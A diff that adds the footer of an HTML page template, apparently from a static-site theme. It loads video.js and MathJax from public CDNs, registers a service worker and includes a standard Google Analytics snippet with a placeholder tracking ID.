+<script async src="https://cdn.jsdelivr.net/npm/video.js@7.3.0/dist/video.min.js"></script>
+
+
+
+
+<script async src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Config({
+    tex2jax: {
+      inlineMath: [['$','$'], ['\\(','\\)']],
+      displayMath: [['$$','$$'], ['\\[','\\]']],
+      processEscapes: true,
+      processEnvironments: true,
+      skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
+      TeX: { equationNumbers: { autoNumber: "AMS" },
+      extensions: ["AMSmath.js", "AMSsymbols.js"] }
+    },
+  });
+</script>
+<script type="text/x-mathjax-config">
+  // Fix <code> tags after MathJax finishes running. This is a
+  // hack to overcome a shortcoming of Markdown. Discussion at
+  // https://github.com/mojombo/jekyll/issues/199
+  MathJax.Hub.Queue(() => {
+    MathJax.Hub.getAllJax().map(v => v.SourceElement().parentNode.className += ' has-jax');
+  });
+</script>
+
+
+
+<script src="/scripts/index.min.js"></script>
+
+<script>
+  if ('serviceWorker' in navigator) {
+    navigator.serviceWorker.register('\/service-worker.js').then(function() {
+      console.log('[ServiceWorker] Registered');
+    });
+  }
+</script>
+
+
+
+
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
+	ga('create', 'UA-XXXXXXXX-X', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+<script async src='https://www.google-analytics.com/analytics.js'></script>
+
+
+
+
+
+
+
+  </body>
+</html>
